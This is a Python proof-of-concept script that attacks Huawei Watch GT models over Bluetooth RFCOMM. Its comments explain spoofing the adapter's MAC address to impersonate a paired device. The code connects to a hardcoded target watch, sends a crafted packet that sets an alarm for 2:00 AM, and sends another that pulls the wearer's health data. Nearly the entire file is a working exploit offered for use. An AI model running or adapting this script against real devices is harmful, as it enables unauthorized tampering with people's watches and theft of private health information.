# Send rfcomm package to Huawei watches
# 
# You should change your bluetooth device address (MAC) first
# For several bluetooth adapters, you can use the bdaddr tools in Linux bluez bluetooth stack
# `sudo bdaddr -i hci1 2C:78:0E:7F:20:40`
# `sudo bdaddr -i hci1 reset`
# And you must physical remove the bluetooth adapter and reconnect it
#
# Other dependencies: pybluez
# `sudo pip3 install pybluez`
#
import bluetooth
import binascii


def bt_discover():
    nearby_devices = bluetooth.discover_devices(lookup_names=True)
    for nearby_device in nearby_devices:
        print(nearby_device)
    return nearby_devices


def sdp_find_service(bd_addr):
    services = bluetooth.find_service(address=bd_addr)
    for svc in services:
        print(svc)
    return services


def rfcomm_connect(bd_addr, port):
    sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
    sock.connect((bd_addr, port))
    print('Connect success')
    return sock


def rfcomm_sendhex(sock, hexdata):
    data = binascii.unhexlify(hexdata)
    sock.send(data)
    print('Send data success')


def rfcomm_readhex(sock):
    data = sock.recv(1024)
    hexdata = binascii.hexlify(data)
    print('Recv data success')
    return hexdata


def hack_watch():
    # HUAWEI Watch GT 2e
    # target_bdaddr = 'D8:9E:61:BF:B7:15'
    # HUAWEI Watch GT 2
    # target_bdaddr = 'A0:D8:07:A3:66:ED'
    # HUAWEI Watch GT 2 Pro
    target_bdaddr = '44:55:C4:DD:E0:93'
    # Set alarm at 2:00 AM
    set_alarm_data = '5a0030000801812b8215030101040101050202000601000706e997b9e9929f82030301028203030103820303010482030301055d2e'
    # Get health data
    get_health_data = '5a000500070301002255'
    # Start a sdp scan first
    services = sdp_find_service(target_bdaddr)
    port = -1
    for svc in services:
        # Get SPP port
        if svc['name'] == 'SerialPort':
            port = svc['port']
            break
    if port != -1:
        print('Found SerialPort Rfcomm port: '+str(port))
        # Connect the target device and open rfcomm port
        socket = rfcomm_connect(target_bdaddr, port)
        rfcomm_sendhex(socket, set_alarm_data)
        recv_data = rfcomm_readhex(socket)
        # If success, recv_data is 5a00090008017f04000186a04e9a
        print(recv_data)
        rfcomm_sendhex(socket, get_health_data)
        recv_data = rfcomm_readhex(socket)
        # If success, recv_data is health data
        print(recv_data)
    else:
        print('No SerialPort Rfcomm port found')


if __name__ == '__main__':
    hack_watch()
